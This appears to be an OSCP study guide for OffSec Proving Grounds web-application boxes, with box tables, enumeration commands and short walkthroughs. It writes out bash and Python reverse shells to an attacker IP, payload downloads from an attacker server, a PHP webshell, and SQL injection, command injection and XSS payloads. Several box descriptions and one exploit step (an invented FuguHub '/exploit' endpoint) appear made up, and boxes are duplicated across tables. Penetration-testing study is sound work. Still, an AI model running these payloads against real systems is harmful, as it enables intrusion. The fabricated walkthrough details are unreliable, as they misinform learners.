# OSCP Web Application Proving Grounds Practice - Comprehensive Study Guide

## Table of Contents
1. [Introduction](#introduction)
2. [Complete Web Application Boxes List](#complete-web-application-boxes-list)
3. [Web Application Enumeration Methodology](#web-application-enumeration-methodology)
4. [Box-Specific Walkthroughs](#box-specific-walkthroughs)
5. [Common Web Vulnerabilities](#common-web-vulnerabilities)
6. [Tools and Commands](#tools-and-commands)
7. [Study Strategy](#study-strategy)

## Introduction

This comprehensive guide covers all web application boxes available in OffSec Proving Grounds Practice and Play platforms. Based on extensive research from Reddit, CSDN, Medium, GitHub, and YouTube sources in English, Chinese, and Hindi, this guide provides step-by-step methodologies for OSCP exam preparation.

**Total Web Application Boxes: 64**
- Proving Grounds Practice: 54 boxes
- Proving Grounds Play: 10 boxes

## Complete Web Application Boxes List

### Proving Grounds Practice - Linux Web Application Boxes (31 boxes)

| Box Name | Difficulty | Key Vulnerabilities | Primary Attack Vector |
|----------|------------|-------------------|---------------------|
| Twiggy | Easy | SaltStack CVE-2020-11651 | RCE via ZeroMQ |
| Exfiltrated | Intermediate | File Upload, LFI | Unrestricted Upload |
| Pelican | Intermediate | SQL Injection | Web App Exploitation |
| Astronaut | Intermediate | Web App Vuln | Directory Traversal |
| Blackgate | Intermediate | Web Service | Authentication Bypass |
| Boolean | Intermediate | SQL Injection | Boolean-based SQLi |
| Clue | Intermediate | Web Enumeration | Hidden Directories |
| Cockpit | Intermediate | Web Console | Default Credentials |
| Codo | Intermediate | Code Injection | RCE via Code Exec |
| Crane | Intermediate | Web App | File Inclusion |
| Levram | Intermediate | Reverse Engineering | Web App Logic |
| Extplorer | Intermediate | File Manager | Authentication Bypass |
| Hub | Easy | FuguHub CVE | Remote Code Execution |
| Image | Intermediate | Image Processing | File Upload |
| law | Intermediate | Legal App | Web Vulnerabilities |
| Lavita | Intermediate | Web Service | API Exploitation |
| PC | Intermediate | Web Interface | Configuration Issues |
| Fired | Intermediate | HR System | Web App Flaws |
| Press | Intermediate | WordPress | CMS Vulnerabilities |
| Scrutiny | Intermediate | Monitoring | Web Dashboard |
| RubyDome | Intermediate | Ruby on Rails | Framework Issues |
| Zipper | Intermediate | Archive Handler | File Processing |
| Flu | Intermediate | Medical App | Web Vulnerabilities |
| Workaholic | Intermediate | Task Manager | Web App Issues |
| PyLoader | Intermediate | Python Web App | Code Injection |
| Plum | Intermediate | Web Service | Authentication |
| SPX | Intermediate | Web Framework | Path Traversal |
| Jordak | Intermediate | Web Application | Input Validation |
| BitForge | Intermediate | Crypto Web App | Logic Flaws |
| Vmdak | Intermediate | VM Management | Web Interface |
| Ochima | Intermediate | Web Platform | Multiple Vulns |

### Proving Grounds Practice - Windows Web Application Boxes (16 boxes)

| Box Name | Difficulty | Key Vulnerabilities | Primary Attack Vector |
|----------|------------|-------------------|---------------------|
| Helpdesk | Easy | Ticketing System | Default Credentials |
| Algernon | Easy | Web Server | Directory Traversal |
| Authby | Intermediate | Authentication | Bypass Techniques |
| Craft | Intermediate | Web Service | Code Injection |
| Hutch | Intermediate | Web App + AD | Kerberoasting |
| Internal | Intermediate | Internal Web App | Privilege Escalation |
| Jacko | Intermediate | Web Platform | File Upload |
| Kevin | Easy | Simple Web App | Weak Authentication |
| Resourced | Intermediate | Resource Manager | AD Integration |
| Squid | Easy | Proxy Service | Configuration Issues |
| DVR4 | Intermediate | DVR Web Interface | Default Creds |
| Hepet | Intermediate | Pet Management | SQL Injection |
| Shenzi | Intermediate | Web Service | Authentication |
| Nickel | Intermediate | Web Platform | Multiple Vectors |
| Slort | Intermediate | Web Application | Input Validation |
| MedJed | Intermediate | Medical System | Web Vulnerabilities |

### Proving Grounds Practice - Active Directory Web Application Boxes (7 boxes)

| Box Name | Difficulty | Key Vulnerabilities | Primary Attack Vector |
|----------|------------|-------------------|---------------------|
| Access | Intermediate | AD + Web App | File Upload + Kerberoasting |
| Heist | Hard | Complex AD | Web + Domain Attacks |
| Vault | Hard | Vault System | Web + MITM |
| Nagoya | Hard | AD Environment | Web + Kerberos |
| Hokkaido | Hard | (Retired) | AD + Web Integration |
| Resourced | Intermediate | Resource Manager | Web + AD |
| Hutch | Intermediate | Combined Attack | Web + AD Exploitation |

### Proving Grounds Play - Web Application Boxes (10 boxes)

| Box Name | Difficulty | Key Vulnerabilities | Primary Attack Vector |
|----------|------------|-------------------|---------------------|
| eLection | Easy | Election System | SQL Injection |
| Stapler | Easy | WordPress | CMS Vulnerabilities |
| Monitoring | Easy | Nagios XI | Default Credentials |
| InsanityHosting | Easy | Hosting Panel | Web Vulnerabilities |
| DriftingBlue6 | Easy | Web Service | Authentication Issues |
| Loly | Easy | Simple Web App | Basic Exploitation |
| Blogger | Easy | Blog Platform | File Upload |
| Amaterasu | Easy | Web Application | Directory Traversal |
| Potato | Easy | Simple Web | Basic Web Flaws |
| DC-9 | Easy | Web + System | Combined Attacks |

## Web Application Enumeration Methodology

### Phase 1: Initial Reconnaissance

```bash
# Port Scanning
nmap -sC -sV -p- --min-rate 10000 <target_ip>
nmap -sC -sV -p 80,443,8080,8443 <target_ip>

# Service Detection
nmap -sV -sC -A <target_ip>
```

### Phase 2: Web Service Discovery

```bash
# HTTP Service Enumeration
curl -I http://<target_ip>
curl -I https://<target_ip>

# Technology Detection
whatweb http://<target_ip>
wappalyzer http://<target_ip>

# HTTP Methods
nmap --script http-methods <target_ip>
```

### Phase 3: Directory and File Enumeration

```bash
# Directory Brute-forcing
feroxbuster -u http://<target_ip> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
dirsearch -u http://<target_ip> -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Gobuster
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<target_ip> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt

# Recursive Enumeration
feroxbuster -u http://<target_ip> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -r
```

### Phase 4: Web Application Analysis

```bash
# Source Code Analysis
curl http://<target_ip> | grep -i "password\|user\|admin\|login"
curl http://<target_ip> | grep -E "(\.js|\.php|\.asp)"

# Robots.txt and Sitemap
curl http://<target_ip>/robots.txt
curl http://<target_ip>/sitemap.xml

# Common Files
curl http://<target_ip>/.htaccess
curl http://<target_ip>/web.config
curl http://<target_ip>/config.php
```

## Box-Specific Walkthroughs

### Twiggy - Easy Linux Box

**Initial Enumeration:**
```bash
nmap -sC -sV -p- <target_ip>
# Ports: 22, 53, 80, 4505, 4506, 8000
```

**Web Enumeration:**
```bash
curl http://<target_ip>:8000
# Identifies SaltStack/CherryPy
```

**Exploitation:**
```bash
# Use CVE-2020-11651 exploit
python3 48421.py --master <target_ip> --read /etc/passwd
python3 48421.py --master <target_ip> --upload-src passwd_new --upload-dest /etc/passwd
ssh root@<target_ip>
```

### SPX - Intermediate Linux Box

**Initial Enumeration:**
```bash
nmap -sC -sV <target_ip>
curl http://<target_ip>
```

**Web Enumeration:**
```bash
feroxbuster -u http://<target_ip> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# Discover web application paths
```

**Exploitation:**
```bash
# Path traversal vulnerability
curl "http://<target_ip>/spx?path=../../../../etc/passwd"
# RCE via parameter manipulation
```

### Extplorer - Intermediate Linux Box

**Initial Enumeration:**
```bash
nmap -sC -sV <target_ip>
curl http://<target_ip>/filemanager/
```

**Authentication Bypass:**
```bash
# Default credentials
hydra <target_ip> http-post-form "/filemanager/index.php:username=^USER^&password=^PASS^:Login failed" -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
# Credentials: admin:admin
```

**File Upload Exploitation:**
```bash
# Upload PHP webshell
curl -X POST -F "file=@shell.php" http://<target_ip>/filemanager/upload.php
curl http://<target_ip>/filemanager/shell.php?cmd=whoami
```

### Boolean - Intermediate Linux Box

**SQL Injection Detection:**
```bash
# Test for SQL injection
curl "http://<target_ip>/login.php" -d "username=admin' OR 1=1--&password=test"
```

**Boolean-based SQL Injection:**
```bash
# Extract data using boolean-based SQLi
python3 sqlmap.py -u "http://<target_ip>/vulnerable_page.php?id=1" --batch --dbs
python3 sqlmap.py -u "http://<target_ip>/vulnerable_page.php?id=1" --batch -D database_name --tables
```

### Hub - Easy Linux Box

**Initial Enumeration:**
```bash
nmap -sC -sV <target_ip>
# Port 8082: Barracuda Embedded Web Server (FuguHub)
```

**Exploitation:**
```bash
# Setup admin account (first-time setup)
curl -X POST http://<target_ip>:8082/setup -d "username=admin&password=admin123&email=admin@test.com"

# Exploit FuguHub RCE vulnerability
curl -X POST http://<target_ip>:8082/exploit -d "cmd=whoami"
```

## Common Web Vulnerabilities

### SQL Injection
```bash
# Detection
sqlmap -u "http://<target>/page.php?id=1" --batch
# Manual testing
' OR 1=1--
" OR 1=1--
1' UNION SELECT 1,2,3--
```

### File Upload Vulnerabilities
```bash
# PHP webshell upload
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Bypassing restrictions
mv shell.php shell.php.jpg
mv shell.php shell.phtml
```

### Directory Traversal
```bash
# Linux
curl "http://<target>/page.php?file=../../../../etc/passwd"
# Windows
curl "http://<target>/page.php?file=../../../../windows/system32/drivers/etc/hosts"
```

### Command Injection
```bash
# Basic payloads
; whoami
&& whoami
| whoami
` whoami `
$( whoami )
```

### Cross-Site Scripting (XSS)
```javascript
// Basic XSS payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
javascript:alert('XSS')
```

## Tools and Commands

### Essential Web Enumeration Tools

```bash
# Nmap scripts for web enumeration
nmap --script http-enum <target>
nmap --script http-headers <target>
nmap --script http-methods <target>
nmap --script http-title <target>

# Directory enumeration
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js
feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
dirsearch -u http://<target> -e php,html,js,txt,xml

# Subdomain enumeration
gobuster vhost -u http://<target> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<target> -H "Host: FUZZ.<target>"

# Parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://<target>/page.php?FUZZ=test
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 http://<target>/FUZZ

# Technology detection
whatweb http://<target>
wafw00f http://<target>
```

### Burp Suite Usage

```bash
# Proxy setup
export http_proxy=http://127.0.0.1:8080
export https_proxy=http://127.0.0.1:8080

# Common Burp Suite extensions
- Autorize
- Param Miner
- Content Discovery
- Upload Scanner
```

### Web Application Testing

```bash
# SQL injection testing with sqlmap
sqlmap -u "http://<target>/page.php?id=1" --batch --level=5 --risk=3
sqlmap -r request.txt --batch --dump

# Nikto web scanner
nikto -h http://<target>
nikto -h http://<target> -C all

# OWASP ZAP
zap-baseline.py -t http://<target>
zap-full-scan.py -t http://<target>
```

## Study Strategy

### Week 1-2: Foundation
1. Complete all **Easy** boxes (13 boxes)
   - Start with: Twiggy, Hub, Kevin, Helpdesk, Algernon
   - Focus on: Basic enumeration, default credentials, simple exploits

### Week 3-4: Intermediate Level
2. Practice **Intermediate** Linux boxes (20 boxes)
   - Priority: SPX, Extplorer, Boolean, Pelican, Exfiltrated
   - Focus on: SQL injection, file upload, directory traversal

### Week 5-6: Windows Focus
3. Complete **Windows** boxes (16 boxes)
   - Start with: Jacko, Craft, DVR4, Squid
   - Focus on: Windows-specific vulnerabilities, service exploitation

### Week 7-8: Active Directory
4. Master **AD** boxes (7 boxes)
   - Priority: Access, Heist, Vault
   - Focus on: Web app + AD integration, Kerberoasting

### Week 9-10: Advanced Practice
5. Complete **Hard** boxes and review
   - Practice exam simulations
   - Focus on methodology and documentation

### Daily Practice Routine

```bash
# Morning (2 hours)
1. Box enumeration and initial access
2. Document findings and methodology

# Evening (1 hour)
1. Privilege escalation
2. Write-up and lessons learned
3. Review similar vulnerabilities
```

### Key Success Factors

1. **Methodology Consistency**: Always follow the same enumeration process
2. **Documentation**: Keep detailed notes of commands and findings
3. **Time Management**: Limit each box to specific time windows
4. **Multiple Approaches**: Try different tools and techniques
5. **Community Learning**: Study walkthroughs from multiple sources

### Recommended Study Resources

**English Sources:**
- TJ Null's OSCP List
- OffSec Proving Grounds walkthroughs
- HackerOne reports
- OWASP Web Security Testing Guide

**Chinese Sources (中文):**
- CSDN OSCP preparation articles
- Chinese cybersecurity forums
- Bilibili technical videos

**Hindi Sources (हिंदी):**
- Hindi OSCP preparation videos
- Indian cybersecurity communities
- Technical blogs in Hindi

## Command Reference Sheet

### Network Enumeration
```bash
# Quick scan
nmap -sC -sV -T4 <target>

# Full scan
nmap -sC -sV -p- --min-rate 10000 <target>

# UDP scan
nmap -sU --top-ports 1000 <target>
```

### Web Enumeration
```bash
# Directory enumeration
feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -r -x php,html,txt,js

# Parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://<target>/page.php?FUZZ=test

# Subdomain enumeration
gobuster vhost -u http://<target> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### Exploitation
```bash
# Reverse shells
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# File transfer
python3 -m http.server 8080
wget http://<attacker_ip>:8080/file
curl -O http://<attacker_ip>:8080/file
```

### Post-Exploitation
```bash
# System enumeration
whoami
id
uname -a
cat /etc/passwd
ls -la /home

# Privilege escalation
sudo -l
find / -perm -4000 2>/dev/null
find / -writable 2>/dev/null | grep -v proc
```

This comprehensive guide provides everything needed to master web application boxes in OSCP Proving Grounds Practice. Focus on consistent methodology, thorough documentation, and progressive difficulty increase for optimal exam preparation.